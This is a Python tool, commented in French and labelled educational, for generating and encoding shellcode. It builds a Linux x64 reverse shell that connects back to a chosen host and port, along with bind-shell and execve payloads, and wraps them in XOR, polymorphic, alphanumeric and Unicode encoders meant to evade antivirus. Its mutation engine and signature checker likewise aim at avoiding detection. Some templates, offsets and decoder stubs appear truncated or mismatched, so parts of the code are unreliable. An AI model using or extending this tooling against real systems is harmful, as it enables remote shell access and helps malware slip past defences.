#!/usr/bin/env python3
"""
ShellForge - Encodeur de Shellcodes Avancé
==========================================

Générateur et encodeur de shellcodes polymorphes avec techniques d'évasion
antivirus et support multi-plateformes pour l'exploitation avancée.

Author: Cybersecurity Portfolio
Version: 1.0.0
License: MIT (Educational Use Only)
"""

import struct
import random
import hashlib
import itertools
import logging
from typing import Dict, List, Optional, Any, Tuple, Callable
from dataclasses import dataclass
from enum import Enum
import keystone
import capstone

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class Architecture(Enum):
    """Architectures supportées"""
    X86 = "x86"
    X64 = "x64"
    ARM = "arm"
    ARM64 = "arm64"

class Platform(Enum):
    """Plateformes cibles"""
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"

class EncodingType(Enum):
    """Types d'encodage disponibles"""
    XOR = "xor"
    XOR_POLY = "xor_polymorphic"
    ADD = "additive"
    SUB = "subtractive"
    ROL = "rotate_left"
    ROR = "rotate_right"
    ALPHA_MIXED = "alpha_mixed"
    UNICODE = "unicode"
    CUSTOM = "custom"

@dataclass
class ShellcodeTemplate:
    """Template de shellcode"""
    name: str
    arch: Architecture
    platform: Platform
    template: bytes
    placeholders: Dict[str, int] = None
    description: str = ""

@dataclass
class EncodedShellcode:
    """Shellcode encodé avec métadonnées"""
    original: bytes
    encoded: bytes
    decoder_stub: bytes
    encoding_type: EncodingType
    key: bytes
    final_payload: bytes
    evasion_score: int = 0

class ShellcodeGenerator:
    """Générateur de shellcodes multi-plateformes"""
    
    def __init__(self, arch: Architecture, platform: Platform):
        self.arch = arch
        self.platform = platform
        
        # Configuration des assembleurs
        if arch == Architecture.X86:
            self.ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)
            self.cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)
        elif arch == Architecture.X64:
            self.ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64)
            self.cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
        elif arch == Architecture.ARM:
            self.ks = keystone.Ks(keystone.KS_ARCH_ARM, keystone.KS_MODE_ARM)
            self.cs = capstone.Cs(capstone.CS_ARCH_ARM, capstone.CS_MODE_ARM)
        else:
            self.ks = keystone.Ks(keystone.KS_ARCH_ARM64, keystone.KS_MODE_LITTLE_ENDIAN)
            self.cs = capstone.Cs(capstone.CS_ARCH_ARM64, capstone.CS_MODE_ARM)
        
        self.templates = self._load_templates()
    
    def _load_templates(self) -> Dict[str, ShellcodeTemplate]:
        """Charge les templates de shellcodes"""
        templates = {}
        
        if self.arch == Architecture.X64 and self.platform == Platform.LINUX:
            # Reverse shell Linux x64
            templates['reverse_shell'] = ShellcodeTemplate(
                name="reverse_shell",
                arch=self.arch,
                platform=self.platform,
                template=bytes([
                    # socket(AF_INET, SOCK_STREAM, 0)
                    0x6a, 0x29,                     # push 0x29 (socket syscall)
                    0x58,                           # pop rax
                    0x99,                           # cdq
                    0x6a, 0x02,                     # push 0x2 (AF_INET)
                    0x5f,                           # pop rdi
                    0x6a, 0x01,                     # push 0x1 (SOCK_STREAM)
                    0x5e,                           # pop rsi
                    0x0f, 0x05,                     # syscall
                    
                    # connect()
                    0x97,                           # xchg eax, edi (save socket fd)
                    0x68, 0x7f, 0x00, 0x00, 0x01,   # push 0x0100007f (127.0.0.1)
                    0x66, 0x68, 0x11, 0x5c,         # push word 0x5c11 (port 4444)
                    0x66, 0x6a, 0x02,               # push word 0x2 (AF_INET)
                    0x54,                           # push rsp
                    0x5e,                           # pop rsi
                    0x6a, 0x10,                     # push 0x10 (sockaddr size)
                    0x5a,                           # pop rdx
                    0x6a, 0x2a,                     # push 0x2a (connect syscall)
                    0x58,                           # pop rax
                    0x0f, 0x05,                     # syscall
                    
                    # dup2() for stdin, stdout, stderr
                    0x6a, 0x03,                     # push 0x3
                    0x5e,                           # pop rsi
                    0x48, 0xff, 0xce,               # dec rsi
                    0x6a, 0x21,                     # push 0x21 (dup2 syscall)
                    0x58,                           # pop rax
                    0x0f, 0x05,                     # syscall
                    0x75, 0xf6,                     # jnz (loop)
                    
                    # execve("/bin/sh", NULL, NULL)
                    0x6a, 0x3b,                     # push 0x3b (execve syscall)
                    0x58,                           # pop rax
                    0x99,                           # cdq
                    0x48, 0xbb, 0x2f, 0x62, 0x69,   # movabs rbx, '/bin/sh'
                    0x6e, 0x2f, 0x73, 0x68, 0x00,
                    0x53,                           # push rbx
                    0x54,                           # push rsp
                    0x5f,                           # pop rdi
                    0x0f, 0x05                      # syscall
                ]),
                placeholders={
                    'host_ip': 19,      # Position de l'IP dans le shellcode
                    'host_port': 24     # Position du port dans le shellcode
                },
                description="Linux x64 reverse shell shellcode"
            )
            
            # Bind shell Linux x64
            templates['bind_shell'] = ShellcodeTemplate(
                name="bind_shell",
                arch=self.arch,
                platform=self.platform,
                template=bytes([
                    # Bind shell template (simplifié)
                    0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f,
                    0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x97, 0x96,
                    0xb0, 0x21, 0x0f, 0x05, 0x83, 0xc6, 0x03
                ]),
                placeholders={'port': 8},
                description="Linux x64 bind shell shellcode"
            )
        
        elif self.arch == Architecture.X86 and self.platform == Platform.WINDOWS:
            # Windows reverse shell (exemple simplifié)
            templates['reverse_shell'] = ShellcodeTemplate(
                name="reverse_shell",
                arch=self.arch,
                platform=self.platform,
                template=bytes([
                    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0,
                    0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,
                    0x52, 0x51, 0x56, 0x48, 0x31, 0xd2
                ]),
                placeholders={'host_ip': 10, 'host_port': 15},
                description="Windows x86 reverse shell shellcode"
            )
        
        return templates
    
    def generate_reverse_shell(self, host: str, port: int) -> bytes:
        """Génère un shellcode reverse shell"""
        if 'reverse_shell' not in self.templates:
            logger.error(f"No reverse shell template for {self.arch.value}/{self.platform.value}")
            return b""
        
        template = self.templates['reverse_shell']
        shellcode = bytearray(template.template)
        
        # Remplacement des placeholders
        if 'host_ip' in template.placeholders:
            ip_bytes = self._ip_to_bytes(host)
            pos = template.placeholders['host_ip']
            shellcode[pos:pos+4] = ip_bytes
        
        if 'host_port' in template.placeholders:
            port_bytes = struct.pack(">H", port)
            pos = template.placeholders['host_port']
            shellcode[pos:pos+2] = port_bytes
        
        logger.info(f"Generated reverse shell shellcode: {len(shellcode)} bytes")
        return bytes(shellcode)
    
    def generate_bind_shell(self, port: int) -> bytes:
        """Génère un shellcode bind shell"""
        if 'bind_shell' not in self.templates:
            logger.error(f"No bind shell template for {self.arch.value}/{self.platform.value}")
            return b""
        
        template = self.templates['bind_shell']
        shellcode = bytearray(template.template)
        
        if 'port' in template.placeholders:
            port_bytes = struct.pack(">H", port)
            pos = template.placeholders['port']
            shellcode[pos:pos+2] = port_bytes
        
        logger.info(f"Generated bind shell shellcode: {len(shellcode)} bytes")
        return bytes(shellcode)
    
    def generate_execve(self, command: str, args: List[str] = None) -> bytes:
        """Génère un shellcode execve"""
        if args is None:
            args = []
        
        if self.arch == Architecture.X64 and self.platform == Platform.LINUX:
            # Assemblage dynamique du shellcode execve
            asm_code = f'''
                mov rax, 59                 ; execve syscall
                lea rdi, [rip + cmd]        ; filename
                xor rsi, rsi                ; argv = NULL
                xor rdx, rdx                ; envp = NULL
                syscall
                
                cmd: db "{command}", 0
            '''
            
            try:
                encoding, count = self.ks.asm(asm_code)
                shellcode = bytes(encoding)
                logger.info(f"Generated execve shellcode: {len(shellcode)} bytes")
                return shellcode
            except Exception as e:
                logger.error(f"Failed to assemble execve shellcode: {e}")
                return b""
        
        return b""
    
    def _ip_to_bytes(self, ip: str) -> bytes:
        """Convertit une adresse IP en bytes"""
        try:
            parts = [int(part) for part in ip.split('.')]
            return bytes(parts)
        except:
            return b"\x7f\x00\x00\x01"  # localhost par défaut

class ShellcodeEncoder:
    """Encodeur de shellcodes avec techniques d'évasion"""
    
    def __init__(self, arch: Architecture = Architecture.X64):
        self.arch = arch
        
        # Configuration de l'assembleur pour les decoder stubs
        if arch == Architecture.X86:
            self.ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)
        else:
            self.ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64)
    
    def encode_xor(self, shellcode: bytes, key: bytes = None) -> EncodedShellcode:
        """Encode avec XOR simple"""
        if key is None:
            key = bytes([random.randint(1, 255)])
        
        encoded = bytearray()
        for i, byte in enumerate(shellcode):
            encoded.append(byte ^ key[i % len(key)])
        
        # Génération du decoder stub
        if self.arch == Architecture.X64:
            decoder_asm = f'''
                jmp short get_shellcode
                decoder:
                    pop rsi                     ; adresse du shellcode encodé
                    xor rcx, rcx
                    mov cl, {len(shellcode)}    ; taille du shellcode
                decode_loop:
                    xor byte ptr [rsi], {key[0]} ; décodage XOR
                    inc rsi
                    loop decode_loop
                    jmp shellcode_start
                get_shellcode:
                    call decoder
                shellcode_start:
            '''
        else:
            decoder_asm = f'''
                jmp short get_shellcode
                decoder:
                    pop esi
                    xor ecx, ecx
                    mov cl, {len(shellcode)}
                decode_loop:
                    xor byte ptr [esi], {key[0]}
                    inc esi
                    loop decode_loop
                    jmp shellcode_start
                get_shellcode:
                    call decoder
                shellcode_start:
            '''
        
        try:
            decoder_bytes, _ = self.ks.asm(decoder_asm)
            decoder_stub = bytes(decoder_bytes)
        except Exception as e:
            logger.error(f"Failed to generate XOR decoder: {e}")
            decoder_stub = b""
        
        result = EncodedShellcode(
            original=shellcode,
            encoded=bytes(encoded),
            decoder_stub=decoder_stub,
            encoding_type=EncodingType.XOR,
            key=key,
            final_payload=decoder_stub + bytes(encoded),
            evasion_score=3
        )
        
        logger.info(f"XOR encoded shellcode: {len(result.final_payload)} bytes")
        return result
    
    def encode_xor_polymorphic(self, shellcode: bytes, iterations: int = 3) -> EncodedShellcode:
        """Encode avec XOR polymorphe (multiple keys)"""
        current_shellcode = shellcode
        keys = []
        
        for _ in range(iterations):
            key = bytes([random.randint(1, 255) for _ in range(random.randint(1, 4))])
            keys.append(key)
            
            encoded = bytearray()
            for i, byte in enumerate(current_shellcode):
                encoded.append(byte ^ key[i % len(key)])
            current_shellcode = bytes(encoded)
        
        # Decoder polymorphe complexe
        decoder_asm = '''
            jmp short get_shellcode
            decoder:
                pop rsi
        '''
        
        # Ajout des boucles de décodage pour chaque clé
        for i, key in enumerate(reversed(keys)):
            decoder_asm += f'''
                xor rcx, rcx
                mov cl, {len(shellcode)}
            decode_loop_{i}:
                xor byte ptr [rsi], {key[0]}
                inc rsi
                loop decode_loop_{i}
                sub rsi, {len(shellcode)}  ; reset position
            '''
        
        decoder_asm += '''
                jmp shellcode_start
            get_shellcode:
                call decoder
            shellcode_start:
        '''
        
        try:
            decoder_bytes, _ = self.ks.asm(decoder_asm)
            decoder_stub = bytes(decoder_bytes)
        except Exception as e:
            logger.error(f"Failed to generate polymorphic decoder: {e}")
            decoder_stub = b""
        
        result = EncodedShellcode(
            original=shellcode,
            encoded=current_shellcode,
            decoder_stub=decoder_stub,
            encoding_type=EncodingType.XOR_POLY,
            key=b''.join(keys),
            final_payload=decoder_stub + current_shellcode,
            evasion_score=7
        )
        
        logger.info(f"Polymorphic XOR encoded shellcode: {len(result.final_payload)} bytes")
        return result
    
    def encode_additive(self, shellcode: bytes, key: int = None) -> EncodedShellcode:
        """Encode avec addition"""
        if key is None:
            key = random.randint(1, 255)
        
        encoded = bytearray()
        for byte in shellcode:
            encoded.append((byte + key) % 256)
        
        # Decoder additif
        decoder_asm = f'''
            jmp short get_shellcode
            decoder:
                pop rsi
                xor rcx, rcx
                mov cl, {len(shellcode)}
            decode_loop:
                sub byte ptr [rsi], {key}
                inc rsi
                loop decode_loop
                jmp shellcode_start
            get_shellcode:
                call decoder
            shellcode_start:
        '''
        
        try:
            decoder_bytes, _ = self.ks.asm(decoder_asm)
            decoder_stub = bytes(decoder_bytes)
        except Exception as e:
            logger.error(f"Failed to generate additive decoder: {e}")
            decoder_stub = b""
        
        result = EncodedShellcode(
            original=shellcode,
            encoded=bytes(encoded),
            decoder_stub=decoder_stub,
            encoding_type=EncodingType.ADD,
            key=key.to_bytes(1, 'big'),
            final_payload=decoder_stub + bytes(encoded),
            evasion_score=4
        )
        
        logger.info(f"Additive encoded shellcode: {len(result.final_payload)} bytes")
        return result
    
    def encode_alpha_mixed(self, shellcode: bytes) -> EncodedShellcode:
        """Encode en alphanumerique mixte"""
        # Implémentation simplifiée de l'encodage alphanumérique
        encoded = bytearray()
        
        for byte in shellcode:
            # Conversion en représentation alphanumérique
            high_nibble = (byte >> 4) & 0x0F
            low_nibble = byte & 0x0F
            
            # Mapping vers caractères alphanumériques
            high_char = high_nibble + 0x41 if high_nibble < 10 else high_nibble + 0x37
            low_char = low_nibble + 0x41 if low_nibble < 10 else low_nibble + 0x37
            
            encoded.extend([high_char, low_char])
        
        # Decoder alphanumérique (simplifié)
        decoder_stub = b"PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI"
        
        result = EncodedShellcode(
            original=shellcode,
            encoded=bytes(encoded),
            decoder_stub=decoder_stub,
            encoding_type=EncodingType.ALPHA_MIXED,
            key=b"",
            final_payload=decoder_stub + bytes(encoded),
            evasion_score=8
        )
        
        logger.info(f"Alpha-mixed encoded shellcode: {len(result.final_payload)} bytes")
        return result
    
    def encode_unicode(self, shellcode: bytes) -> EncodedShellcode:
        """Encode en Unicode pour évasion"""
        # Technique d'évasion Unicode (Venice)
        encoded = bytearray()
        
        for byte in shellcode:
            # Conversion en UTF-16LE avec padding
            encoded.extend([byte, 0x00])
        
        # Decoder Unicode minimal
        decoder_stub = bytes([
            0x54,                           # push esp
            0x59,                           # pop ecx
            0xB0, len(shellcode) & 0xFF,    # mov al, shellcode_length
            0x04, 0x04,                     # add al, 4
            0x2C, 0x04,                     # sub al, 4
            0x02, 0xE0,                     # add ah, al
            0x30, 0x01,                     # xor [ecx], al
            0x41, 0x41,                     # inc ecx; inc ecx
            0xFE, 0xC8,                     # dec al
            0x75, 0xF8                      # jnz decode_loop
        ])
        
        result = EncodedShellcode(
            original=shellcode,
            encoded=bytes(encoded),
            decoder_stub=decoder_stub,
            encoding_type=EncodingType.UNICODE,
            key=b"",
            final_payload=decoder_stub + bytes(encoded),
            evasion_score=6
        )
        
        logger.info(f"Unicode encoded shellcode: {len(result.final_payload)} bytes")
        return result
    
    def encode_custom(self, shellcode: bytes, encoder_func: Callable[[bytes], bytes]) -> EncodedShellcode:
        """Encode avec fonction personnalisée"""
        encoded = encoder_func(shellcode)
        
        result = EncodedShellcode(
            original=shellcode,
            encoded=encoded,
            decoder_stub=b"",  # À implémenter selon l'encodage
            encoding_type=EncodingType.CUSTOM,
            key=b"",
            final_payload=encoded,
            evasion_score=5
        )
        
        logger.info(f"Custom encoded shellcode: {len(result.final_payload)} bytes")
        return result

class PolymorphicEngine:
    """Moteur polymorphe pour variation automatique"""
    
    def __init__(self, arch: Architecture = Architecture.X64):
        self.arch = arch
    
    def mutate_shellcode(self, shellcode: bytes, mutations: int = 5) -> bytes:
        """Applique des mutations polymorphes"""
        mutated = bytearray(shellcode)
        
        for _ in range(mutations):
            mutation_type = random.choice(['nop_insertion', 'register_substitution', 'junk_code'])
            
            if mutation_type == 'nop_insertion':
                # Insertion de NOPs équivalents
                pos = random.randint(0, len(mutated))
                nop_variants = [b'\x90', b'\x91\x91', b'\x40\x40']  # NOP variants
                mutated[pos:pos] = random.choice(nop_variants)
            
            elif mutation_type == 'register_substitution':
                # Substitution de registres équivalents
                # Implémentation simplifiée
                pass
            
            elif mutation_type == 'junk_code':
                # Insertion de code sans effet
                pos = random.randint(0, len(mutated))
                junk = b'\x50\x58'  # push rax; pop rax (no-op)
                mutated[pos:pos] = junk
        
        logger.info(f"Applied {mutations} polymorphic mutations")
        return bytes(mutated)
    
    def generate_metamorphic(self, shellcode: bytes) -> List[bytes]:
        """Génère plusieurs versions métamorphiques"""
        variants = []
        
        for i in range(5):
            variant = self.mutate_shellcode(shellcode, random.randint(3, 8))
            variants.append(variant)
        
        logger.info(f"Generated {len(variants)} metamorphic variants")
        return variants

class ShellcodeAnalyzer:
    """Analyseur de shellcodes pour détection de signatures"""
    
    def __init__(self):
        self.av_signatures = [
            b'\x6a\x29\x58',           # socket() syscall signature
            b'\x6a\x02\x5f',           # AF_INET signature
            b'\x0f\x05',               # syscall instruction
            b'/bin/sh',                # common shell string
            b'cmd.exe',                # Windows command shell
            b'\x68\x7f\x00\x00\x01'   # localhost IP
        ]
    
    def analyze_signatures(self, shellcode: bytes) -> Dict[str, Any]:
        """Analyse les signatures détectables"""
        detections = []
        
        for sig in self.av_signatures:
            if sig in shellcode:
                detections.append({
                    'signature': sig.hex(),
                    'description': 'Potential AV signature',
                    'positions': [i for i in range(len(shellcode)) if shellcode[i:i+len(sig)] == sig]
                })
        
        analysis = {
            'detections': detections,
            'risk_score': len(detections) * 2,
            'recommendations': self._get_recommendations(detections)
        }
        
        return analysis
    
    def _get_recommendations(self, detections: List[Dict]) -> List[str]:
        """Génère des recommandations d'amélioration"""
        recommendations = []
        
        if detections:
            recommendations.append("Consider using polymorphic encoding")
            recommendations.append("Apply multiple encoding layers")
            recommendations.append("Use metamorphic techniques")
            recommendations.append("Implement custom encoders")
        
        return recommendations

def main():
    """Exemple d'utilisation de ShellForge"""
    
    # Génération de shellcode
    generator = ShellcodeGenerator(Architecture.X64, Platform.LINUX)
    shellcode = generator.generate_reverse_shell("192.168.1.100", 4444)
    
    print(f"Original shellcode: {len(shellcode)} bytes")
    print(f"Hex: {shellcode.hex()}")
    
    # Encodage
    encoder = ShellcodeEncoder(Architecture.X64)
    
    # XOR simple
    xor_encoded = encoder.encode_xor(shellcode)
    print(f"\nXOR encoded: {len(xor_encoded.final_payload)} bytes")
    print(f"Evasion score: {xor_encoded.evasion_score}/10")
    
    # XOR polymorphe
    poly_encoded = encoder.encode_xor_polymorphic(shellcode, 3)
    print(f"\nPolymorphic encoded: {len(poly_encoded.final_payload)} bytes")
    print(f"Evasion score: {poly_encoded.evasion_score}/10")
    
    # Analyse de signatures
    analyzer = ShellcodeAnalyzer()
    analysis = analyzer.analyze_signatures(shellcode)
    print(f"\nSignature analysis:")
    print(f"Risk score: {analysis['risk_score']}/10")
    print(f"Detections: {len(analysis['detections'])}")
    
    # Moteur polymorphe
    poly_engine = PolymorphicEngine(Architecture.X64)
    variants = poly_engine.generate_metamorphic(shellcode)
    print(f"\nGenerated {len(variants)} metamorphic variants")

if __name__ == "__main__":
    main()